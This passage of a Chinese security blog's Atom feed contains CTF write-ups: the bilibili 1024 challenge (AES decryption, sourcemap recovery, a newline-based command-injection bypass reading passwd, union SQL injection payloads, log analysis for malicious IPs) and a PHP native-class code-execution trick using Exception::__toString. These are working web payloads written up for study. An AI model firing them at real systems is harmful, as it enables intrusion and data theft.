      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2021 bilibili 1024挑战赛</title>
    <link href="https://c1aysec.github.io/2021/11/04/2021%20bilibili%201024%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>https://c1aysec.github.io/2021/11/04/2021 bilibili 1024挑战赛/</id>
    <published>2021-11-04T06:31:32.609Z</published>
    <updated>2021-11-04T06:50:31.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-bilibili-1024挑战赛"><a href="#2021-bilibili-1024挑战赛" class="headerlink" title="2021 bilibili 1024挑战赛"></a>2021 bilibili 1024挑战赛</h1><h3 id="安全攻防"><a href="#安全攻防" class="headerlink" title="安全攻防"></a>安全攻防</h3><p><strong>第一题：</strong></p><p>1024程序员节，大家一起和2233参与解密游戏吧~<br>happy_1024_2233:<br>e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364<br>0408abca7deabb96a58f50471171b60e02b1a8dbd32db156</p><p>aes ecb，密文和密钥都给了，直接写脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></div><div class="line">        self.key = key</div><div class="line">        <span class="comment">#self.key = key + (32-len(key)) * chr(0)</span></div><div class="line">        <span class="comment"># self.key = key + (24-len(key)) * chr(0) # AES-192-ECB</span></div><div class="line">        self.key = key + (<span class="number">16</span>-len(key)) * chr(<span class="number">0</span>) <span class="comment"># AES-128-ECB</span></div><div class="line">        self.BLOCK_SIZE = <span class="number">16</span>  <span class="comment"># Bytes</span></div><div class="line">        self.pad = <span class="keyword">lambda</span> s: s + (self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE) * chr(self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE)</div><div class="line">        <span class="comment">#self.unpad = lambda s: s[:-ord(s[len(s) - 1:])]</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, enc)</span>:</span></div><div class="line">        enc=binascii.a2b_hex(enc)</div><div class="line">        <span class="comment">#enc=enc.decode("hex")</span></div><div class="line">        cipher = AES.new(self.key, AES.MODE_ECB)</div><div class="line">        <span class="keyword">return</span> cipher.decrypt(enc)</div><div class="line"></div><div class="line"><span class="keyword">print</span> AESCipher(<span class="string">"happy_1024_2233"</span>).decrypt(<span class="string">"e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d3640408abca7deabb96a58f50471171b60e02b1a8dbd32db156"</span>)</div></pre></td></tr></table></figure><p>a1cd5f84-27966146-3776f301-64031bb9</p><p><strong>第二题：</strong></p><p>某高级前端开发攻城狮更改了一个前端配置项<br><a href="https://security.bilibili.com/sec1024/q/" target="_blank" rel="external">https://security.bilibili.com/sec1024/q/</a></p><p>根据提示是sourceMap</p><p>下载<br><a href="https://security.bilibili.com/sec1024/q/js/chunk-4871f04e.e8a41f19.js.map" target="_blank" rel="external">https://security.bilibili.com/sec1024/q/js/chunk-4871f04e.e8a41f19.js.map</a></p><p>通过restore-source-tree还原<br>在home.vue当中发现flag</p><p><img src="http://pic.c1imber.top/blog/20211104/cTn7gt8R0lwC.png?imageslim" alt="mark"></p><p>36c7a7b4-cda04af0-8db0368d-b5166480</p><p><strong>第三题：</strong></p><p>PHP is the best language for web programming, but what about other languages?<br><a href="https://security.bilibili.com/sec1024/q/eval.zip" target="_blank" rel="external">https://security.bilibili.com/sec1024/q/eval.zip</a></p><p>php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="comment">/* </span></div><div class="line"><span class="comment">        bilibili- ( ゜- ゜)つロ 乾杯~</span></div><div class="line"><span class="comment">        uat: http://192.168.3.2/uat/eval.php</span></div><div class="line"><span class="comment">        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span></div><div class="line"><span class="comment">    */</span></div><div class="line">    $args = @$_GET[<span class="string">'args'</span>];</div><div class="line">    <span class="keyword">if</span> (count($args) &gt;<span class="number">3</span>) &#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</div><div class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) ) &#123;</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// <span class="doctag">todo:</span> other filter</span></div><div class="line">    $cmd = <span class="string">"/bin/2233 "</span> . implode(<span class="string">" "</span>, $args);</div><div class="line">    exec($cmd, $out);</div><div class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;count($out); $i++)&#123;</div><div class="line">        <span class="keyword">echo</span>($out[$i]);</div><div class="line">        <span class="keyword">echo</span>(<span class="string">'&lt;br&gt;'</span>);</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><code>preg_match</code>的<code>$</code>可以用<code>%0A</code>换行符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//security.bilibili.com/sec1024/q/pro/eval.php?args[0]=x%0A&amp;args[1]=ls</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211104/GQEK4wkurXC7.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//security.bilibili.com/sec1024/q/pro/eval.php?args[0]=x%0A&amp;args[1]=cat&amp;args[2]=passwd</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211104/2BGUYFSG3mDp.png?imageslim" alt="mark"></p><p>9d3c3014-6c6267e7-086aaee5-1f18452a</p><p><strong>第四题：</strong></p><p>sql注入</p><p>空格会影响注入，用<code>/**/</code>绕过空格即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /sec1024/q/admin/api/v1/log/list HTTP/1.1</div><div class="line">Host: security.bilibili.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: application/json, text/plain, */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/json;charset=utf-8</div><div class="line">Content-Length: 190</div><div class="line">Origin: https://security.bilibili.com</div><div class="line">Connection: close</div><div class="line">Referer: https://security.bilibili.com/sec1024/q/</div><div class="line"></div><div class="line">&#123;"user_id":"","user_name":"1/**/union/**/select/**/1,group_concat(table_name),3,4,5/**/from/**/information_schema.tables/**/where/**/table_schema=database()#","action":"","page":1,"size":20&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211104/4P7GnxOaFJX9.png?imageslim" alt="mark"></p><p>单引号会影响注入，用16进制编码一下</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /sec1024/q/admin/api/v1/log/list HTTP/1.1</div><div class="line">Host: security.bilibili.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: application/json, text/plain, */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/json;charset=utf-8</div><div class="line">Content-Length: 190</div><div class="line">Origin: https://security.bilibili.com</div><div class="line">Connection: close</div><div class="line">Referer: https://security.bilibili.com/sec1024/q/</div><div class="line"></div><div class="line">&#123;"user_id":"","user_name":"1/**/union/**/select/**/1,group_concat(column_name),3,4,5/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167#","action":"","page":1,"size":20&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211104/sjCRQ3q6gMbM.png?imageslim" alt="mark"></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /sec1024/q/admin/api/v1/log/list HTTP/1.1</div><div class="line">Host: security.bilibili.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: application/json, text/plain, */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/json;charset=utf-8</div><div class="line">Content-Length: 111</div><div class="line">Origin: https://security.bilibili.com</div><div class="line">Connection: close</div><div class="line">Referer: https://security.bilibili.com/sec1024/q/</div><div class="line"></div><div class="line">&#123;"user_id":"","user_name":"1/**/union/**/select/**/1,id,3,4,5/**/from/**/flag#","action":"","page":1,"size":20&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211104/gycztWMh2AGS.png?imageslim" alt="mark"></p><p>3d5dd579-0678ef93-18b70cae-cabc5d51</p><p><strong>第七题：</strong></p><p>安全研究员小孙在早上的时候发现了一波异常流量在访问网站，他初步筛选了这些可疑的请求，请帮他找到所有的恶意 IP 。<br>flag 生成方式：找到所有的恶意 IP 后，通过通过英文逗号分隔成一个字符串后提交，系统会根据提交的 IP 正确数计算分数。<br>PS: 解题过程可发送至 security@bilibili.com, 标题: 1024-sec-r7-[你的 mid] 。我们会挑选3位，给予额外惊喜</p><p>题目名称是风控，在对日志流量进行审计后，并没发现有明显的攻击payload，所以我把重点放在了<strong>在某一时间点出现的ip次数</strong>，如果说在某个时间，这个ip请求多次，那么我便将他算入恶意ip之内</p><p>第一步：首先用sublime的正则处理功能将日志当中的时间（@timestamp）和ip（x_backend_bili_real_ip）提取出来</p><p><img src="http://pic.c1imber.top/blog/20211104/S0hzbwBpObyG.png?imageslim" alt="mark"></p><p>第二步：将第一步提取出的481888条时间的出现次数进行计算（时间去重后只剩下302条），得到时间点和该时间点的http请求数</p><p><img src="http://pic.c1imber.top/blog/20211104/znizxaGtukGp.png?imageslim" alt="mark"></p><p>第三步：将第一步提取的时间和ip导入数据库，以便于整理统计</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> bilibili1024;</div><div class="line"><span class="keyword">use</span> bilibili1024;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> fengkong(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,tmptime <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>,ip <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> fengkong(tmptime,ip) <span class="keyword">value</span>(<span class="string">"2021-10-18T02:00:04+0000"</span>,<span class="string">"gg.cej.hd.bii"</span>);</div><div class="line">...</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure><p>第四步：对某个时间出现的ip次数进行计算</p><p>规则：筛选出某一时间同一ip出现次数大于100的ip（100可能有点多了，可以进行适当的减少，例如可以从10、15、20、25…、100这样依次增加）</p><p>可以通过mysql的聚合查询+子查询实现：</p><p>calc.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> ip,<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="keyword">count</span> <span class="keyword">from</span> fengkong <span class="keyword">where</span> tmptime=<span class="string">"2021-10-18T02:00:03+0000"</span> <span class="keyword">group</span> <span class="keyword">by</span> ip)x <span class="keyword">where</span> x.count&gt;<span class="number">100</span>;</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> ip,<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="keyword">count</span> <span class="keyword">from</span> fengkong <span class="keyword">where</span> tmptime=<span class="string">"2021-10-18T02:00:04+0000"</span> <span class="keyword">group</span> <span class="keyword">by</span> ip)x <span class="keyword">where</span> x.count&gt;<span class="number">100</span>;</div><div class="line">...</div></pre></td></tr></table></figure><p>编写php批量执行sql，获得结果，php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$servername = <span class="string">"localhost"</span>;</div><div class="line">$username = <span class="string">"root"</span>;</div><div class="line">$password = <span class="string">"root"</span>;</div><div class="line">$dbname = <span class="string">"bilibili1024"</span>;</div><div class="line"></div><div class="line">$lines = file(<span class="string">"calc.sql"</span>);</div><div class="line"></div><div class="line"><span class="comment">// 创建连接</span></div><div class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</div><div class="line"><span class="comment">// Check connection</span></div><div class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span>($lines <span class="keyword">as</span> $line) &#123;</div><div class="line">    $sql = rtrim($line);</div><div class="line">    <span class="comment">//print("$sql\n");</span></div><div class="line">    $result = $conn-&gt;query($sql);</div><div class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="comment">// 输出数据</span></div><div class="line">        <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</div><div class="line">            <span class="keyword">echo</span> $row[<span class="string">'count'</span>].<span class="string">"\t"</span>.$row[<span class="string">'ip'</span>].<span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$conn-&gt;close();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">112bfh.ff.dj.jf</div><div class="line">106bfh.ff.dj.jf</div><div class="line">106bfh.ff.dj.jf</div><div class="line">109bfh.ff.dj.jf</div><div class="line">107bfh.ff.dj.jf</div><div class="line">110bfh.ff.dj.jf</div><div class="line">115bfh.ff.dj.jf</div><div class="line">113bfh.ff.dj.jf</div><div class="line">122bfh.ff.dj.jf</div><div class="line">137bfh.ff.dj.jf</div><div class="line">798cd.baf.cae.cbc</div><div class="line">1652cd.baf.cae.cbc</div><div class="line">2805cd.baf.cae.cbc</div><div class="line">1546cd.bb.cai.cbh</div><div class="line">1563cdd.bcc.bg.bib</div><div class="line">1520dc.bcc.bg.bib</div><div class="line">1577cd.bb.cai.cbh</div><div class="line">1566cdd.bcc.bg.bib</div><div class="line">1562dc.bcc.bg.bib</div><div class="line">1569cd.bb.cai.cbh</div><div class="line">1551cdd.bcc.bg.bib</div><div class="line">1506dc.bcc.bg.bib</div><div class="line">4735cd.baf.cae.cbc</div><div class="line">1564cd.bb.cai.cbh</div><div class="line">1539cdd.bcc.bg.bib</div><div class="line">1535dc.bcc.bg.bib</div><div class="line">1578cd.bb.cai.cbh</div><div class="line">1589cdd.bcc.bg.bib</div><div class="line">1568dc.bcc.bg.bib</div><div class="line">2461bba.ja.cca.beg</div><div class="line">2424bba.ja.ccb.cbc</div><div class="line">2578bbb.bb.bjd.bgc</div><div class="line">2494bbb.bb.bjd.bgg</div><div class="line">2448bbb.bb.bjd.bha</div><div class="line">2619bbb.bb.bjd.bhc</div><div class="line">2539bbb.bb.bjd.bhf</div><div class="line">2517bba.ja.cca.beg</div><div class="line">2525bba.ja.ccb.cbc</div><div class="line">2542bbb.bb.bjd.bgc</div><div class="line">2563bbb.bb.bjd.bgg</div><div class="line">2473bbb.bb.bjd.bha</div><div class="line">2539bbb.bb.bjd.bhc</div><div class="line">2427bbb.bb.bjd.bhf</div><div class="line">2569bba.ja.cca.beg</div><div class="line">2491bba.ja.ccb.cbc</div><div class="line">2504bbb.bb.bjd.bgc</div><div class="line">2566bbb.bb.bjd.bgg</div><div class="line">2534bbb.bb.bjd.bha</div><div class="line">2636bbb.bb.bjd.bhc</div><div class="line">2521bbb.bb.bjd.bhf</div><div class="line">9531cde.ced.bbb.dd</div><div class="line">9469dc.bb.ii.jj</div><div class="line">9587jj.bdc.bbb.cc</div><div class="line">9406cde.ced.bbb.dd</div><div class="line">9370dc.bb.ii.jj</div><div class="line">9451jj.bdc.bbb.cc</div><div class="line">9559cde.ced.bbb.dd</div><div class="line">9302dc.bb.ii.jj</div><div class="line">9414jj.bdc.bbb.cc</div><div class="line">18854cde.ced.bbb.dd</div><div class="line">18869dc.bb.ii.jj</div><div class="line">18882jj.bdc.bbb.cc</div></pre></td></tr></table></figure><p>去重后得到在某个时间点访问次数超过100的ip:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bba.ja.cca.beg,bba.ja.ccb.cbc,bbb.bb.bjd.bgc,bbb.bb.bjd.bgg,bbb.bb.bjd.bha,bbb.bb.bjd.bhc,bbb.bb.bjd.bhf,bfh.ff.dj.jf,cd.baf.cae.cbc,cd.bb.cai.cbh,cdd.bcc.bg.bib,cde.ced.bbb.dd,dc.bb.ii.jj,dc.bcc.bg.bib,jj.bdc.bbb.cc</div></pre></td></tr></table></figure><p>但是提交后依旧提示：”恭喜您找到了大部分ip地址，请再接再厉”</p><p><img src="http://pic.c1imber.top/blog/20211104/E8z9Cn7y7s0P.png?imageslim" alt="mark"></p><p>自己某一时间点ip出现次数大于100降低到某一时间点ip出现次数大于30后依旧是提示不够</p><p>排除法：</p><p>自己通过某些方法推测出了这道题目可能的检测规则：如果提交总ip数-错误数&gt;=8，就算通过，会提示”恭喜您找到了大部分ip地址”，在这个检测规则的前提下，通过排除法后得到下面这13个ip肯定是对的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bba.ja.cca.beg,bba.ja.ccb.cbc,bbb.bb.bjd.bgc,bbb.bb.bjd.bgg,bbb.bb.bjd.bha,bbb.bb.bjd.bhc,bbb.bb.bjd.bhf,cd.bb.cai.cbh,cdd.bcc.bg.bib,cde.ced.bbb.dd,dc.bb.ii.jj,dc.bcc.bg.bib,jj.bdc.bbb.cc</div></pre></td></tr></table></figure><p>但是提交了依旧只能拿10分</p><p>其他思路：</p><p>1、根据某一时间内相同设备(根据user-agent)的访问次数这个规则来选择恶意ip，但是这个方法选择的ip会非常多，提交后会出现错误</p><p>2、通过看浏览发现里面存在很多百度、谷歌、必应的爬虫请求，但是我认为爬虫不能算恶意请求，因为有时候需要对网站进行seo</p><p>3、获取敏感信息的接口：<br>/activity/account/check/myinfo.<em><br>/account/history.</em><br>但是这些接口并不存在越权，而且通过这种方法找到的ip和通过时间找到的ip差不多一致</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2021-bilibili-1024挑战赛&quot;&gt;&lt;a href=&quot;#2021-bilibili-1024挑战赛&quot; class=&quot;headerlink&quot; title=&quot;2021 bilibili 1024挑战赛&quot;&gt;&lt;/a&gt;2021 bilibili 1024挑战赛&lt;/
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化原生类</title>
    <link href="https://c1aysec.github.io/2021/10/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>https://c1aysec.github.io/2021/10/21/php反序列化原生类/</id>
    <published>2021-10-21T03:03:12.960Z</published>
    <updated>2021-10-21T08:21:50.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php反序列化原生类"><a href="#php反序列化原生类" class="headerlink" title="php反序列化原生类"></a>php反序列化原生类</h1><p>记录一下在ctf当中遇到的有关php反序列化原生类的利用</p><h3 id="预定义异常类：例如Exception类-toString"><a href="#预定义异常类：例如Exception类-toString" class="headerlink" title="预定义异常类：例如Exception类__toString"></a>预定义异常类：例如Exception类__toString</h3><p><strong>2021第二届全国电信和互联网行业职业技能竞赛-SimplePHP</strong></p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">    maybe you need get the contents in hint.php!</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">    Ohhhhh you don't know how to get it?</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">    Why don't you try readfile?</span></div><div class="line"><span class="comment">**/</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Hello</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $filename;</div><div class="line">    <span class="keyword">public</span> $contents;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">"hint.php"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;contents = <span class="string">"you guess"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fileread</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"keep going"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a = $_GET[<span class="string">"a"</span>];</div><div class="line">$b = $_GET[<span class="string">"b"</span>];</div><div class="line">$c = $_GET[<span class="string">"c"</span>];</div><div class="line">$d = $_GET[<span class="string">"d"</span>];</div><div class="line">$e = $_GET[<span class="string">"e"</span>];</div><div class="line">$f = $_GET[<span class="string">"f"</span>];</div><div class="line">$g = $_GET[<span class="string">"g"</span>];</div><div class="line"></div><div class="line"></div><div class="line">$class = <span class="keyword">new</span> $a($b);</div><div class="line">$str1 = substr($class-&gt;$c(),$d,$e);</div><div class="line">$str2 = substr($class-&gt;$c(),$f,$g);</div><div class="line">$str1($str2);</div></pre></td></tr></table></figure><p>阅读源码可以看到<code>$str1($str2);</code>的位置有可能存在任意代码执行，而<code>$a、$b、$c</code>可控存在任意方法调用，这里可以利用php的内置类<code>Exception</code>的<code>__toString</code>方法来触发任意代码执行</p><p>本地测试demo代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$class=<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"test string"</span>);</div><div class="line"><span class="keyword">echo</span> $class-&gt;__toString();</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">exception</span> <span class="string">'Exception'</span> with message <span class="string">'test string'</span> in C:\phpstudy_pro\WWW\<span class="number">222.</span>php:<span class="number">2</span> Stack trace: <span class="comment">#0 &#123;main&#125;</span></div></pre></td></tr></table></figure><p>所以可以通过<code>new Exception(&quot;xxx&quot;);</code>实例化一个<code>Exception</code>类，这样<code>$str1</code>和<code>$str2</code>都变为我们可控的了</p><p>任意代码执行payload，执行<code>phpinfo</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$class=<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"phpinfo1"</span>);</div><div class="line"><span class="keyword">echo</span> substr($class-&gt;__toString(),<span class="number">36</span>,<span class="number">7</span>);</div><div class="line"><span class="keyword">echo</span> substr($class-&gt;__toString(),<span class="number">43</span>,<span class="number">1</span>);</div></pre></td></tr></table></figure><p>输出:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">phpinfo1</div></pre></td></tr></table></figure><p>所以可以构造paylaod执行phpinfo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//119.61.19.212:57504/index.php?a=Exception&amp;b=phpinfo1&amp;c=__toString&amp;d=36&amp;e=7&amp;f=43&amp;g=1</span></div></pre></td></tr></table></figure><p><img 